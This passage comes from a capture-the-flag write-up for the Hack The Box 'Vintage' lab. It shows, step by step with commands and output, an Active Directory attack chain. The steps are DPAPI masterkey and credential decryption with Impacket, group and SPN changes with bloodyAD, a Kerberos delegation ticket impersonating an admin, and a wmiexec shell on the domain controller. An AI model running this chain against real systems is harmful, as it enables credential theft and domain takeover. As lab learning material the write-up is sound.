*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ADUser -Identity svc_sql -Properties ServicePrincipalNames


DistinguishedName     : CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
Enabled               : False
GivenName             :
Name                  : svc_sql
ObjectClass           : user
ObjectGUID            : 3fb41501-6742-4258-bfbe-602c3a8aa543
SamAccountName        : svc_sql
ServicePrincipalNames : {}
SID                   : S-1-5-21-4024337825-2033394866-2055507597-1134
Surname               :
UserPrincipalName     :



*Evil-WinRM* PS C:\Users\C.Neri\Documents>  Set-ADUser -Identity svc_sql -Add @{servicePrincipalName="cifs/what_ever_name"}
*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ADUser -Identity svc_sql -Properties ServicePrincipalNames


DistinguishedName     : CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
Enabled               : False
GivenName             :
Name                  : svc_sql
ObjectClass           : user
ObjectGUID            : 3fb41501-6742-4258-bfbe-602c3a8aa543
SamAccountName        : svc_sql
ServicePrincipalNames : {cifs/what_ever_name}
SID                   : S-1-5-21-4024337825-2033394866-2055507597-1134
Surname               :
UserPrincipalName     :



*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami /user

USER INFORMATION
----------------

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115
*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\C.Neri\Documents> dir C:\Users\C.Neri\AppData\Roaming\Microsoft/Protect/S-1-5-21-4024337825-2033394866-2055507597-1115 -Force


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred

*Evil-WinRM* cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
*Evil-WinRM* download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
~~~

Impacket's DPAPI module to decrypt a DPAPI (Data Protection API) Master Key from a given file.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
~~~

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312

~~~
![](/assets/img/sample/vintage/C.NERL_ADM%20.png)


The next step is added **C.NERL_ADM** into **DELEGATEDADMINS**.

~~~ shell
──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─#  bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d vintage.htb  -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL" 
[+] SVC_SQL added to DELEGATEDADMINS
                                                                                                                                                             
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d "vintage.htb" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/fake" 
[+] SVC_SQL's servicePrincipalName has been updated

~~~

Get ticket.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─#  impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb

┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# export KRB5CCNAME=svc_sql.ccache

┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne'  
 
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache

┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\> whoami
vintage\l.bianchi_adm
C:\> type Users\Administrator\Desktop\root.txt
~~~

***Thank you for readling this far! I hope this writeup helps you in your learning and research.***